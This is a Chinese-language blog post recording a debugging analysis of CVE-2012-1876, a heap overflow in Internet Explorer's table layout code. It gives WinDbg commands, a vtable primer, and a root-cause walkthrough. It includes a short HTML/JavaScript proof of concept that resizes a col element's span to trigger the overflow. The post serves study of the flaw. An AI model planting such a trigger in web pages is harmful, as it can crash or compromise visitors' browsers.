{"title":"CVE-2012-1876分析记录","date":"2019-01-10T13:03:28.000Z","slug":"CVE-2012-1876分析记录","updated":"2019-03-08T14:07:10.003Z","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>这个cve是比较典型的ie中的堆溢出的漏洞利用，网上有许多的分析的文章，但对于漏洞的调试还是要自己亲手调一遍才能转换为自己的知识，这里记录一些调试的时候遇到的问题和一些笔记。</p>\n<h3 id=\"windbg的一些命令\"><a href=\"#windbg的一些命令\" class=\"headerlink\" title=\"windbg的一些命令\"></a>windbg的一些命令</h3><ol>\n<li>symbol的设置：新建一个环境变量_NT_SYMBOL_PATH 值为: SRV<em>c:\\mysymbol</em> <a href=\"http://msdl.microsoft.com/download/symbols\" target=\"_blank\" rel=\"noopener\">http://msdl.microsoft.com/download/symbols</a></li>\n<li>.sympath显示当前的symbol的配置</li>\n<li>对于gflag.exe -i “名称” +hpc +hpa这些命令，进程名称一定要注意，比如可能是iexplore.exe 也可能是iexplore</li>\n<li>ub，uf命令为反汇编，p单步，sxe ld:xxx设置dll断点之类lmm查看模块lmf具体路径之类，.reload /f mshtml.dll加载符号。.childdbg 1开启子进程调试</li>\n<li>bp,bl，bu等等，bu ntdll!RtlFreeHeap “echo free heap;db poi(esp+c) l10;g”这样的可以用来做一些命令。</li>\n<li>s -a 0x00000000 L?7fffffff “FuzzySecurity”查找命令</li>\n<li>gflags.exe -i iexplore.exe +hpa</li>\n</ol>\n<h3 id=\"c-类的虚表\"><a href=\"#c-类的虚表\" class=\"headerlink\" title=\"c++类的虚表\"></a>c++类的虚表</h3><p>简单地说，每一个含有虚函数（无论是其本身的，还是继承而来的）的类都至少有一个与之对应的虚函数表，其中存放着该类所有的虚函数对应的函数指针。例：<br><img src=\"/img/xubiao.png\" alt=\"虚表\"><br>其中：<br>B的虚函数表中存放着B::foo和B::bar两个函数指针。<br>D的虚函数表中存放的既有继承自B的虚函数B::foo，又有重写（override）了基类虚函数B::bar的D::bar，还有新增的虚函数D::quz。</p>\n<h3 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h3><p>漏洞分析网上有许多的文章，具体分析就不写了，主要讲改漏洞的大致成因所在。<br>我将poc改为如下，省去了col的span属性，更容易看清楚漏洞成因。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">style</span>=<span class=\"string\">\"table-layout:fixed\"</span> &gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">col</span> <span class=\"attr\">id</span>=<span class=\"string\">\"132\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"41\"</span> &gt;</span>&amp;nbsp <span class=\"tag\">&lt;/<span class=\"name\">col</span>&gt;</span></span><br><span class=\"line\">\t\t <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>ISBN<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>Title<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>Price<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t  <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t  <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>3476896<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>My first HTML<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>$53<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\"> </span></span><br><span class=\"line\"><span class=\"undefined\"> function over_trigger() &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        var obj_col = document.getElementById(\"132\");</span></span><br><span class=\"line\"><span class=\"undefined\">        obj_col.width = \"42765\";</span></span><br><span class=\"line\"><span class=\"undefined\">        obj_col.span = 5;</span></span><br><span class=\"line\"><span class=\"undefined\"> &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"> </span></span><br><span class=\"line\"><span class=\"undefined\"> setTimeout(\"over_trigger();\",1);</span></span><br><span class=\"line\"><span class=\"undefined\"> </span></span><br><span class=\"line\"><span class=\"undefined\"> </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<ol>\n<li>首先搞清楚span属性的性质，该属性作用于col的主要用来规定 col 元素应该横跨的列数。具体参考 <a href=\"http://www.runoob.com/tags/att-col-span.html\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/tags/att-col-span.html</a> 即可。</li>\n<li>浏览器首先渲染3个col，该值被存储在[CTableLayout+0x54]中，利用函数EnsueSizeWorker分配4个col内存大小来装下3个col。</li>\n<li>通过js改变col的span属性，将span改为5，漏洞成因在这里出现，程序并没有重新将该span的值放入[CTableLayout+0x54]，在进入EnsueSizeWorker分配内存的条件中没有重新进行分配。</li>\n<li>浏览器通过AdjustForCol为每个col调整属性，由于span规定了col元素应该横跨的列数，所以程序的错误的将span的值作为循环条件，导致在对第5个不存在的col调整属性的时候崩溃。<br>没有细致的分析CalculateMinMax之前的函数，我在调的时候发现[CTableLayout+0x54]存的值并不是span的值，如下代码<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">style</span>=<span class=\"string\">\"table-layout:fixed\"</span> &gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">col</span> <span class=\"attr\">id</span>=<span class=\"string\">\"132\"</span> <span class=\"attr\">width</span>=<span class=\"string\">\"41\"</span> <span class=\"attr\">span</span>=<span class=\"string\">\"2\"</span>&gt;</span>&amp;nbsp <span class=\"tag\">&lt;/<span class=\"name\">col</span>&gt;</span></span><br><span class=\"line\">\t\t <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>ISBN<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>Title<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>Price<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t  <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t  <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>3476896<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>My first HTML<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>$53<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>调试的时候[CTableLayout+0x54]并不是2而是3。</p>\n<p>###参考<br><a href=\"http://www.dbgtech.net/windbghelp/index.html\" target=\"_blank\" rel=\"noopener\">http://www.dbgtech.net/windbghelp/index.html</a><br><a href=\"http://eternalsakura13.com/2018/03/10/cve2012_1876/\" target=\"_blank\" rel=\"noopener\">http://eternalsakura13.com/2018/03/10/cve2012_1876/</a><br><a href=\"https://bbs.pediy.com/thread-153363.htm\" target=\"_blank\" rel=\"noopener\">https://bbs.pediy.com/thread-153363.htm</a></p>\n","prev":{"title":"使用frida进行android的hook","slug":"使用frida进行android的hook"},"next":{"title":"初学web安全记录","slug":"初学web安全记录"},"link":"https://foyjog.github.io/post/CVE-2012-1876分析记录/"}